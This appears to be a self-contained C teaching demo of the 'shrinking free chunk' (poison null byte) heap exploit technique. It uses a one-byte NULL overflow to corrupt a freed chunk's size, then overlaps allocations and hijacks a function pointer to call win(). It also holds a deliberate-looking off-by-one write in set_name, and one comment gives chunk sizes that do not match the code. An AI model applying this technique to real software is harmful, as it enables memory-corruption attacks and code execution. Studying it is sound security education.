#include <stdio.h>
#include <stdlib.h>
#include <string.h>
/*
	Shrinking Free Chunk

	
	heap layout:
		-------
		   A 		<=  not free
		-------
		   B 		<=  freed,		size of chunk B will overwrite to shrink
		-------
		   C 		<=	not free,   but prev_size of chunk C never update, so free C, will unlink B , and consolidating chunk B and Chunk C


	exploit: 
		Shrinking Free Chunk

	0x01:
	free chunk B
	
	0x02:
	overwrite size field of freed chunk B to shrink chunk B's real size, such as NULL byte overwrite!

	0x03:
	remalloc 2 chunk which reuse chunk B memory

	0x04:
	free first new chunk

	0x05:
	free chunk C

	0x06:
	remalloc a big chunk whose size = sizeof(chunk B) or size <  ( sizeof(chunk B) + sizeof(chunk C) ) 


	0x07:
	set data for new big chunk to overwrite function pointer of second new chunk.



*/
#define M_SIZE 			sizeof(size_t)
#define CHUNK_HDR_SIZE	2*M_SIZE
#define MIN_NORMAL_BIN  CHUNK_HDR_SIZE * 8   	

struct obj{
	void(*fn_setname)(struct obj *pobj, char*);
	void(*fn_getname)(struct obj *pobj);
	char name[0x20];
};


void set_name(struct obj *pobj, char *name) 
{
	memcpy(pobj->name, name, 0x20);
	pobj->name[0x20] = '\x00';
}

void get_name(struct obj *pobj) 
{
	printf("chunk: %p -> name: %s\n", pobj, pobj->name);
}

void win() 
{
	printf("exploit!\n");
}

int main() {
	char * A, * B, * C, * D, * E;
	struct obj  *pobj;

	A = malloc(0x110 - M_SIZE); 
	B = malloc(0x110 - M_SIZE);  
	C = malloc(0x110 - M_SIZE); 

	free(B); // Freeing B

	/* 
	* one byte Overflow in A
	* The old chunk B's size becomes 0x181 instead of 0x101
	*/
	A[0x110 - CHUNK_HDR_SIZE + M_SIZE] = NULL;			// one NULL byte overwrite the size field of chunk B


	/*
	* Allocation chunk D and chunk obj to reuse chunk B freed memory
	*/
	D = malloc(MIN_NORMAL_BIN);    
	printf("New D chunk: %p \n", D); 

	pobj = (struct obj*)malloc(sizeof(struct obj));   	// Chunk being overlapped
	printf("New obj: %p \n", pobj); 	
	pobj->fn_setname = set_name;
	pobj->fn_getname = get_name;
	pobj->fn_setname(pobj, "this is obj");
	pobj->fn_getname(pobj);

	free(D);

	free(C);

	/*
	 * new big chunk to overwrite chunk obj
	 */
	E = malloc(0x110 - M_SIZE);    
	printf("New E chunk: %p \n", E); 
	*(size_t*)(&E[MIN_NORMAL_BIN + CHUNK_HDR_SIZE + M_SIZE]) = win;

	/* 
	 * pobj will be ovewrite!
	 */
	pobj->fn_getname(pobj);		


	getchar();
	//free(A);
	//free(pobj);
	//free(E);			// will cause corrupted double-linked!

	return 0;
}